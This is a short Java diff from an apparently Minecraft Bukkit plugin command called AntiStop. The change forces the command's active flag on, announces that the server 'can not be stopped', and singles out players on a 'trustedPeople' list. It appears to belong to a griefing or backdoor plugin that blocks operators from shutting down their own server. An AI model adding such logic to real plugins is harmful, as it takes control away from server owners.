@@ -40,7 +40,7 @@ public class AntiStop extends Command {
             method = cancelMethod.Mistype;
         if (args.get(0).toLowerCase().equals("cancel"))
             method = cancelMethod.Cancel;
-        isActive = !isActive;
+        isActive = true;
         p.sendMessage(Start.Prefix + "§aServer now can not be stopped!");
         for (Player r : Bukkit.getOnlinePlayers()) {
             if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
